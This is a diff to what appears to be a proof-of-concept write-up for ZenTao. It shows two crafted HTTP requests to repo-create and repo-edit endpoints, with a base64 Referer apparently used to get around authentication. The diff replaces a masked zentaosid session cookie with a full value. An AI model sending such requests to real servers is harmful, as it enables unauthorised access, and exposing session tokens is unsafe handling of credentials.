@@ -113,7 +113,7 @@ http://your-ip:8084/?mode=getconfig
 ```http
 POST /repo-create.html HTTP/1.1
 Host: your-ip:8084
-Cookie: zentaosid=6************************n; lang=zh-cn; device=desktop; theme=default
+Cookie: zentaosid=69ld7c5h6n02k7i4iumt346den; lang=zh-cn; device=desktop; theme=default
 Referer: http://your-ip:8084/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
 Accept-Encoding: gzip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36
@@ -133,7 +133,7 @@ product%5B%5D=1&SCM=Gitlab&name=poc&path=&encoding=utf-8&client=&account=&passwo
 POST /repo-edit-10000-10000.html HTTP/1.1
 Host: your-ip:8084
 Content-Type: application/x-www-form-urlencoded
-Cookie: zentaosid=6************************n; lang=zh-cn; device=desktop; theme=default
+Cookie: zentaosid=69ld7c5h6n02k7i4iumt346den; lang=zh-cn; device=desktop; theme=default
 Referer: http://your-ip:8084/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM=
 X-Requested-With: XMLHttpRequest
 Accept-Encoding: gzip
